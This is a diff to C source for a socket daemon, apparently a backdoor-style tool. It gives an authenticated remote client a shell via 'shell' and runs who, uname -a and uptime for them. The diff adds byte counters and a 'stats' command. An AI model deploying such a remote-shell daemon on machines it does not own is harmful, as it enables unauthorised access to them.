@@ -19,8 +19,8 @@ static void	handle_new_connection(t_shield *daemon, fd_set *read_fds)
 		{
 			daemon->client_fds[daemon->client_count] = client_fd;
 			daemon->client_authenticated[daemon->client_count] = 0;
-			const char *prompt = ">_ passcode: ";
-			send(client_fd, prompt, strlen(prompt), 0);
+			const char *pass_prompt = ">_ passcode: ";
+			daemon->bytes_out += send(client_fd, pass_prompt, strlen(pass_prompt), 0);
 			daemon->client_count++;
 		}
 		else
@@ -54,6 +54,7 @@ static void	process_client_messages(t_shield *daemon, fd_set *read_fds)
 				i--;
 				continue ;
 			}
+			daemon->bytes_in += bytes_read;
 
 			buffer[bytes_read] = '\0';
 			char *newline = strchr(buffer, '\n');
@@ -66,7 +67,7 @@ static void	process_client_messages(t_shield *daemon, fd_set *read_fds)
 				if (verify_pass(buffer))
 				{
 					daemon->client_authenticated[i] = 1;
-					display_prompt(client_fd);
+					display_prompt(client_fd, daemon);
 				}
 				else
 				{
@@ -84,7 +85,7 @@ static void	process_client_messages(t_shield *daemon, fd_set *read_fds)
 			else
 			{
 				if (!strcmp(buffer, "?"))
-					print_usage(client_fd);
+					print_usage(client_fd, daemon);
 				else if (!strcmp(buffer, "shell"))
 				{
 					spawn_shell(daemon, client_fd);
@@ -92,14 +93,19 @@ static void	process_client_messages(t_shield *daemon, fd_set *read_fds)
 				}
 				else if (!strcmp(buffer, "users"))
 				{
-					send_cmd_output("who", client_fd);
-					display_prompt(client_fd);
+					send_sys_output("who", client_fd, daemon);
+					display_prompt(client_fd, daemon);
 				}
 				else if (!strcmp(buffer, "system"))
 				{
-					send_cmd_output("uname -a", client_fd);
-					send_cmd_output("uptime", client_fd);
-					display_prompt(client_fd);
+					send_sys_output("uname -a", client_fd, daemon);
+					send_sys_output("uptime", client_fd, daemon);
+					display_prompt(client_fd, daemon);
+				}
+				else if (!strcmp(buffer, "stats"))
+				{
+					display_stats(client_fd, daemon, i + 1);
+					display_prompt(client_fd, daemon);
 				}
 				else if (!strcmp(buffer, "quit"))
 				{
@@ -107,7 +113,7 @@ static void	process_client_messages(t_shield *daemon, fd_set *read_fds)
 					break ;
 				}
 				else
-					display_prompt(client_fd);
+					display_prompt(client_fd, daemon);
 			}
 		}
 	}
